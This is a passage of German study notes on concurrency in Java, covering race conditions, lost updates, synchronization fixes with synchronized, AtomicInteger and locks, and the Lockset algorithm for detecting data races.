</code></pre><p>In diesem Beispiel kann die Methode <code>adjustBalance</code> von mehreren Threads gleichzeitig aufgerufen werden, ohne dass eine Synchronisierung stattfindet. Das führt zu Race Conditions, da mehrere Threads gleichzeitig auf <code>balance</code> zugreifen und es ändern können.</p><h4 id="Szenario-einer-Race-Condition"><a class="anchor hidden-xs" href="#Szenario-einer-Race-Condition" title="Szenario-einer-Race-Condition"><i class="fa fa-link"></i></a>Szenario einer Race Condition</h4><p>Angenommen, zwei Threads (<code>Thread A</code> und <code>Thread B</code>) rufen gleichzeitig <code>adjustBalance</code> auf:</p><ul>
<li><code>Thread A</code>: Führt <code>adjustBalance(100)</code> aus.</li>
<li><code>Thread B</code>: Führt <code>adjustBalance(-50)</code> aus.</li>
</ul><p>Ohne Synchronisierung kann folgendes passieren:</p><ol>
<li><code>Thread A</code> liest den aktuellen <code>balance</code> (z.B. 100).</li>
<li><code>Thread B</code> liest den aktuellen <code>balance</code> ebenfalls (100).</li>
<li><code>Thread A</code> erhöht den <code>balance</code> um 100 (<code>balance = 100 + 100 = 200</code>).</li>
<li><code>Thread B</code> verringert den <code>balance</code> um 50 (<code>balance = 100 - 50 = 50</code>).</li>
<li>Die Änderungen werden gespeichert: Der endgültige <code>balance</code> könnte 50 oder 200 sein, abhängig davon, welche Operation zuletzt gespeichert wird.</li>
</ol><h3 id="Probleme-im-Multi-Threaded-Kontext"><a class="anchor hidden-xs" href="#Probleme-im-Multi-Threaded-Kontext" title="Probleme-im-Multi-Threaded-Kontext"><i class="fa fa-link"></i></a>Probleme im Multi-Threaded-Kontext</h3><p><strong>Data Races</strong> treten auf, wenn zwei oder mehr Threads gleichzeitig auf dieselben Speicherstellen zugreifen, wobei mindestens einer davon schreibend ist.</p><ol>
<li>
<p><strong>Race Conditions (Data Races)</strong>:</p>
<ul>
<li>Eine Race Condition tritt auf, wenn mehrere Threads gleichzeitig auf gemeinsame Daten zugreifen und deren Zustand ändern, ohne ausreichend synchronisiert zu sein. In Ihrem Beispiel könnte dies dazu führen, dass der Kontostand inkonsistent wird, wenn mehrere Threads gleichzeitig versuchen, <code>adjustBalance</code> aufzurufen.</li>
</ul>
</li>
<li>
<p><strong>Verlorene Updates</strong>:</p>
<ul>
<li>Wenn zwei Threads gleichzeitig versuchen, den <code>balance</code> zu aktualisieren, kann es vorkommen, dass die Änderungen eines Threads überschrieben werden, bevor sie vom anderen Thread gespeichert werden. Dies führt dazu, dass eine oder mehrere der Änderungen “verloren” gehen und der endgültige Kontostand nicht korrekt ist.</li>
</ul>
</li>
<li>
<p><strong>Nicht-Atomare Operationen</strong>:</p>
<ul>
<li>Die Operation <code>balance = balance + adjustment</code> ist nicht atomar, was bedeutet, dass sie in mehrere Schritte aufgeteilt werden kann: Lesen des aktuellen <code>balance</code>, Hinzufügen von <code>adjustment</code> und Schreiben des neuen Werts zurück in <code>balance</code>. Ohne Synchronisierung könnte ein anderer Thread inmitten dieser Schritte eingreifen und den Kontostand in einen inkonsistenten Zustand versetzen.</li>
</ul>
</li>
</ol><h3 id="Warum-sind-Race-Conditions-problematisch"><a class="anchor hidden-xs" href="#Warum-sind-Race-Conditions-problematisch" title="Warum-sind-Race-Conditions-problematisch"><i class="fa fa-link"></i></a>Warum sind Race Conditions problematisch?</h3><ul>
<li>
<p><strong>Unerwartete Ergebnisse</strong>: Race Conditions können dazu führen, dass der Zustand einer Anwendung nicht vorhersehbar wird, da er von der Reihenfolge der Thread-Ausführung abhängt.</p>
</li>
<li>
<p><strong>Schwer zu reproduzieren</strong>: Da Race Conditions von der spezifischen Thread-Scheduling und Timing abhängen, können sie schwer zu finden und zu debuggen sein.</p>
</li>
<li>
<p><strong>Potenziell fehlerhaftes Verhalten</strong>: In Anwendungen wie Finanztransaktionen können Race Conditions dazu führen, dass Geldbeträge falsch berechnet oder Transaktionen inkonsistent durchgeführt werden.</p>
</li>
<li>
<p><strong>Nicht-Determinismus</strong>: Data Races führen zu nicht-deterministischem Verhalten, da der Ergebnis einer Operation davon abhängt, welcher Thread zuerst auf eine gemeinsame Variable zugreift.</p>
</li>
</ul><h3 id="“No-Out-of-thin-air”-Strategie"><a class="anchor hidden-xs" href="#“No-Out-of-thin-air”-Strategie" title="“No-Out-of-thin-air”-Strategie"><i class="fa fa-link"></i></a>“No Out-of-thin-air” Strategie</h3><p>Die “No Out-of-thin-air” Strategie ist eine Lösung, um Data Races zu vermeiden und deterministische Ausführung sicherzustellen:</p><ul>
<li>
<p><strong>Vermeidung von willkürlichen Werten</strong>: Diese Strategie stellt sicher, dass keine neuen, unvorhersehbaren Werte in die Register eingeführt werden, was zu konsistenteren und vorhersehbareren Programmabläufen führt.</p>
</li>
<li>
<p><strong>Eliminierung zirkulärer Kausalität</strong>: Durch die “No Out-of-thin-air” Strategie werden zirkuläre Kausalitätsschleifen beseitigt, die zu undefiniertem Verhalten führen können, indem klare Regeln für den Zugriff auf gemeinsame Daten festgelegt werden.</p>
</li>
<li></li>
</ul><h3 id="Data-Races-in-Klausur-erkennen"><a class="anchor hidden-xs" href="#Data-Races-in-Klausur-erkennen" title="Data-Races-in-Klausur-erkennen"><i class="fa fa-link"></i></a>Data Races in Klausur erkennen</h3><ol>
<li>
<p><strong>Gemeinsame Datenzugriffe</strong>: Suchen nach Variablen oder Datenstrukturen, die von mehreren Threads gleichzeitig gelesen oder geändert werden könnten.</p>
</li>
<li>
<p><strong>Fehlende Synchronisierung</strong>: Prüfe, ob kritische Abschnitte des Codes nicht durch Mechanismen geschützt sind, die sicherstellen, dass nur ein Thread zur gleichen Zeit auf diese Daten zugreift.</p>
</li>
<li>
<p><strong>Nicht-atomare Operationen</strong>: Achte auf Operationen, die in mehreren Schritten ausgeführt werden können und währenddessen von anderen Threads unterbrochen werden könnten, insbesondere bei Lese- und Schreibzugriffen auf gemeinsame Variablen.</p>
</li>
</ol><h3 id="Lösungen-für-Multi-Threaded-Programmierung"><a class="anchor hidden-xs" href="#Lösungen-für-Multi-Threaded-Programmierung" title="Lösungen-für-Multi-Threaded-Programmierung"><i class="fa fa-link"></i></a>Lösungen für Multi-Threaded-Programmierung</h3><p>Um die Probleme der Multi-Threaded-Programmierung zu minimieren, sollten Entwickler folgende Techniken und Konzepte beachten:</p><ol>
<li>
<p><strong>Synchronisierung</strong>:</p>
<ul>
<li>Verwendung von Mechanismen wie <code>synchronized</code> in Java, um kritische Abschnitte des Codes zu synchronisieren und Data Races zu verhindern.</li>
</ul>
<p>Beispiel:</p>
<pre><code class="java hljs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title">adjustBalance</span><span class="hljs-params">(<span class="hljs-keyword">int</span> adjustment)</span> </span>{
    balance = balance + adjustment;
}
</code></pre>
</li>
<li>
<p><strong>Atomare Operationen</strong>:</p>
<ul>
<li>Verwendung von atomaren Datentypen und Operationen wie <code>AtomicInteger</code> in Java, um garantierte atomare Operationen sicherzustellen und Data Races zu vermeiden.</li>
</ul>
<p>Beispiel:</p>
<pre><code class="java hljs"><span class="hljs-keyword">private</span> AtomicInteger balance = <span class="hljs-keyword">new</span> AtomicInteger(<span class="hljs-number">0</span>);

<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">adjustBalance</span><span class="hljs-params">(<span class="hljs-keyword">int</span> adjustment)</span> </span>{
    balance.addAndGet(adjustment);
}
</code></pre>
<ul>
<li>Anmerkung:  Datenbanken und Dateisysteme ermöglichen hohen Durchsatz bei gleichzeitigen Transaktionen. Transaktionale Speicher sind immer noch ein Forschungsthema.</li>
</ul>
</li>
<li>
<p><strong>Verwendung von Locks</strong>:</p>
<ul>
<li>Sicherstellen, dass gegenseitiger Ausschluss für gemeinsam genutzte Ressourcen gewährleistet ist, indem Locks verwendet werden. Dies kann durch explizite Sperrobjekte oder Annotationen wie <code>@GuardedBy</code> beschrieben werden.</li>
</ul>
<p>Beispiel:</p>
<pre><code class="java hljs"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Object lock = <span class="hljs-keyword">new</span> Object();
<span class="hljs-meta">@GuardedBy</span>(<span class="hljs-string">"lock"</span>)
<span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> balance;

<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">adjustBalance</span><span class="hljs-params">(<span class="hljs-keyword">int</span> adjustment)</span> </span>{
    <span class="hljs-keyword">synchronized</span> (lock) {
        balance = balance + adjustment;
    }
}
</code></pre>
</li>
<li>
<p><strong>Dynamische und statische Analyse</strong>:</p>
<ul>
<li>Einsatz von Tools wie ThreadSanitizer und Helgrind für die dynamische Analyse zur Erkennung von Race Conditions während der Laufzeit.</li>
<li>Verwendung von statischer Analyse, um potenzielle Race Conditions bereits in der Entwicklungsphase zu identifizieren.</li>
</ul>
</li>
</ol><h3 id="Lockset-Algorithmus"><a class="anchor hidden-xs" href="#Lockset-Algorithmus" title="Lockset-Algorithmus"><i class="fa fa-link"></i></a>Lockset-Algorithmus</h3><p>Der Lockset-Algorithmus ist ein dynamischer Analyseansatz, der verwendet wird, um potenzielle Race Conditions in Multi-Threaded-Programmen zu identifizieren. Hier ist eine Erklärung des Lockset-Algorithmus und wie er funktioniert:</p><h4 id="Grundlegender-Ablauf"><a class="anchor hidden-xs" href="#Grundlegender-Ablauf" title="Grundlegender-Ablauf"><i class="fa fa-link"></i></a>Grundlegender Ablauf:</h4><ol>
<li>
<p><strong>Initialisierung</strong>: Für jede gemeinsam genutzte Variable <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-1-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>x</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-1" style="width: 0.703em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.595em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.781em, 1000.54em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-2"><span class="mi" id="MathJax-Span-3" style="font-family: MathJax_Math-italic;">x</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.628em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi></math></span></span><script type="math/tex" id="MathJax-Element-1">x</script></span> wird eine Menge <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-2-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>C</mi><mo stretchy=&quot;false&quot;>(</mo><mi>x</mi><mo stretchy=&quot;false&quot;>)</mo></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-4" style="width: 2.481em; display: inline-block;"><span style="display: inline-block; position: relative; width: 2.104em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.457em, 1002em, 2.804em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-5"><span class="mi" id="MathJax-Span-6" style="font-family: MathJax_Math-italic;">C<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.057em;"></span></span><span class="mo" id="MathJax-Span-7" style="font-family: MathJax_Main;">(</span><span class="mi" id="MathJax-Span-8" style="font-family: MathJax_Math-italic;">x</span><span class="mo" id="MathJax-Span-9" style="font-family: MathJax_Main;">)</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.372em; border-left: 0px solid; width: 0px; height: 1.316em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></math></span></span><script type="math/tex" id="MathJax-Element-2">C(x)</script></span> initialisiert, die alle Sperren enthält, die potenziell <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-3-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>x</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-10" style="width: 0.703em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.595em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.781em, 1000.54em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-11"><span class="mi" id="MathJax-Span-12" style="font-family: MathJax_Math-italic;">x</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.628em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi></math></span></span><script type="math/tex" id="MathJax-Element-3">x</script></span> schützen könnten.</p>
</li>
<li>
<p><strong>Thread-spezifische Sperren</strong>: Für jeden Thread <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-4-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>t</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-13" style="width: 0.434em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.38em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.565em, 1000.33em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-14"><span class="mi" id="MathJax-Span-15" style="font-family: MathJax_Math-italic;">t</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.878em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>t</mi></math></span></span><script type="math/tex" id="MathJax-Element-4">t</script></span> wird die Menge <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-5-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mtext>locks</mtext><mo stretchy=&quot;false&quot;>(</mo><mi>t</mi><mo stretchy=&quot;false&quot;>)</mo></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-16" style="width: 3.828em; display: inline-block;"><span style="display: inline-block; position: relative; width: 3.289em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.457em, 1003.18em, 2.804em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-17"><span class="mtext" id="MathJax-Span-18" style="font-family: MathJax_Main;">locks</span><span class="mo" id="MathJax-Span-19" style="font-family: MathJax_Main;">(</span><span class="mi" id="MathJax-Span-20" style="font-family: MathJax_Math-italic;">t</span><span class="mo" id="MathJax-Span-21" style="font-family: MathJax_Main;">)</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.372em; border-left: 0px solid; width: 0px; height: 1.316em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mtext>locks</mtext><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></math></span></span><script type="math/tex" id="MathJax-Element-5">\text{locks}(t)</script></span> festgelegt, die die Sperren enthält, die <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-6-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>t</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-22" style="width: 0.434em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.38em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.565em, 1000.33em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-23"><span class="mi" id="MathJax-Span-24" style="font-family: MathJax_Math-italic;">t</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.878em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>t</mi></math></span></span><script type="math/tex" id="MathJax-Element-6">t</script></span> aktuell hält.</p>
</li>
<li>
<p><strong>Zugriff auf eine Variable <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-7-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>x</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-25" style="width: 0.703em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.595em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.781em, 1000.54em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-26"><span class="mi" id="MathJax-Span-27" style="font-family: MathJax_Math-italic;">x</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.628em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi></math></span></span><script type="math/tex" id="MathJax-Element-7">x</script></span></strong>:</p>
<ul>
<li>Wenn ein Thread <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-8-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>t</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-28" style="width: 0.434em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.38em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.565em, 1000.33em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-29"><span class="mi" id="MathJax-Span-30" style="font-family: MathJax_Math-italic;">t</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.878em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>t</mi></math></span></span><script type="math/tex" id="MathJax-Element-8">t</script></span> auf eine Variable <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-9-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>x</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-31" style="width: 0.703em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.595em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.781em, 1000.54em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-32"><span class="mi" id="MathJax-Span-33" style="font-family: MathJax_Math-italic;">x</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.628em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi></math></span></span><script type="math/tex" id="MathJax-Element-9">x</script></span> zugreift, wird die Menge <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-10-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>C</mi><mo stretchy=&quot;false&quot;>(</mo><mi>x</mi><mo stretchy=&quot;false&quot;>)</mo></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-34" style="width: 2.481em; display: inline-block;"><span style="display: inline-block; position: relative; width: 2.104em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.457em, 1002em, 2.804em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-35"><span class="mi" id="MathJax-Span-36" style="font-family: MathJax_Math-italic;">C<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.057em;"></span></span><span class="mo" id="MathJax-Span-37" style="font-family: MathJax_Main;">(</span><span class="mi" id="MathJax-Span-38" style="font-family: MathJax_Math-italic;">x</span><span class="mo" id="MathJax-Span-39" style="font-family: MathJax_Main;">)</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.372em; border-left: 0px solid; width: 0px; height: 1.316em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></math></span></span><script type="math/tex" id="MathJax-Element-10">C(x)</script></span> verfeinert, indem Sperren entfernt werden, die nicht in <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-11-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mtext>locks</mtext><mo stretchy=&quot;false&quot;>(</mo><mi>t</mi><mo stretchy=&quot;false&quot;>)</mo></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-40" style="width: 3.828em; display: inline-block;"><span style="display: inline-block; position: relative; width: 3.289em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.457em, 1003.18em, 2.804em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-41"><span class="mtext" id="MathJax-Span-42" style="font-family: MathJax_Main;">locks</span><span class="mo" id="MathJax-Span-43" style="font-family: MathJax_Main;">(</span><span class="mi" id="MathJax-Span-44" style="font-family: MathJax_Math-italic;">t</span><span class="mo" id="MathJax-Span-45" style="font-family: MathJax_Main;">)</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.372em; border-left: 0px solid; width: 0px; height: 1.316em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mtext>locks</mtext><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></math></span></span><script type="math/tex" id="MathJax-Element-11">\text{locks}(t)</script></span> enthalten sind.</li>
<li>Wenn nach dieser Verfeinerung <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-12-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>C</mi><mo stretchy=&quot;false&quot;>(</mo><mi>x</mi><mo stretchy=&quot;false&quot;>)</mo><mo>=</mo><mi mathvariant=&quot;normal&quot;>&amp;#x2205;</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-46" style="width: 4.582em; display: inline-block;"><span style="display: inline-block; position: relative; width: 3.936em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.457em, 1003.88em, 2.804em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-47"><span class="mi" id="MathJax-Span-48" style="font-family: MathJax_Math-italic;">C<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.057em;"></span></span><span class="mo" id="MathJax-Span-49" style="font-family: MathJax_Main;">(</span><span class="mi" id="MathJax-Span-50" style="font-family: MathJax_Math-italic;">x</span><span class="mo" id="MathJax-Span-51" style="font-family: MathJax_Main;">)</span><span class="mo" id="MathJax-Span-52" style="font-family: MathJax_Main; padding-left: 0.272em;">=</span><span class="mi" id="MathJax-Span-53" style="font-family: MathJax_Main; padding-left: 0.272em;">∅</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.372em; border-left: 0px solid; width: 0px; height: 1.316em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="normal">∅</mi></math></span></span><script type="math/tex" id="MathJax-Element-12">C(x) = \emptyset</script></span> ist, wird eine Warnung ausgegeben, da dies darauf hinweist, dass <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-13-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>x</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-54" style="width: 0.703em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.595em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.781em, 1000.54em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-55"><span class="mi" id="MathJax-Span-56" style="font-family: MathJax_Math-italic;">x</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.628em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi></math></span></span><script type="math/tex" id="MathJax-Element-13">x</script></span> von <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-14-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>t</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-57" style="width: 0.434em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.38em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.565em, 1000.33em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-58"><span class="mi" id="MathJax-Span-59" style="font-family: MathJax_Math-italic;">t</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.878em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>t</mi></math></span></span><script type="math/tex" id="MathJax-Element-14">t</script></span> ohne ausreichenden Schutz (Sperre) gelesen oder geschrieben wurde, was zu einer potenziellen Race Condition führen könnte.</li>
</ul>
</li>
</ol><h4 id="Beispiel1"><a class="anchor hidden-xs" href="#Beispiel1" title="Beispiel1"><i class="fa fa-link"></i></a>Beispiel:</h4><p>Angenommen, wir haben folgenden Java-Code:</p><pre><code class="java hljs"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> sharedData = <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object lock1 = <span class="hljs-keyword">new</span> Object();
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object lock2 = <span class="hljs-keyword">new</span> Object();

<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">updateSharedData</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">synchronized</span> (lock1) {
        sharedData = sharedData + <span class="hljs-number">1</span>;
    }
}

<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getSharedData</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">synchronized</span> (lock2) {
        <span class="hljs-keyword">return</span> sharedData;
    }
}
</code></pre><ul>
<li>Für die Variable <code>sharedData</code> würden die Locksets wie folgt aussehen:
<ul>
<li>Für <code>updateSharedData()</code>: <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-15-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>C</mi><mo stretchy=&quot;false&quot;>(</mo><mtext>sharedData</mtext><mo stretchy=&quot;false&quot;>)</mo><mo>=</mo><mo fence=&quot;false&quot; stretchy=&quot;false&quot;>{</mo><mtext>lock1</mtext><mo fence=&quot;false&quot; stretchy=&quot;false&quot;>}</mo></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-60" style="width: 12.88em; display: inline-block;"><span style="display: inline-block; position: relative; width: 11.102em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.457em, 1011.05em, 2.804em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-61"><span class="mi" id="MathJax-Span-62" style="font-family: MathJax_Math-italic;">C<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.057em;"></span></span><span class="mo" id="MathJax-Span-63" style="font-family: MathJax_Main;">(</span><span class="mtext" id="MathJax-Span-64" style="font-family: 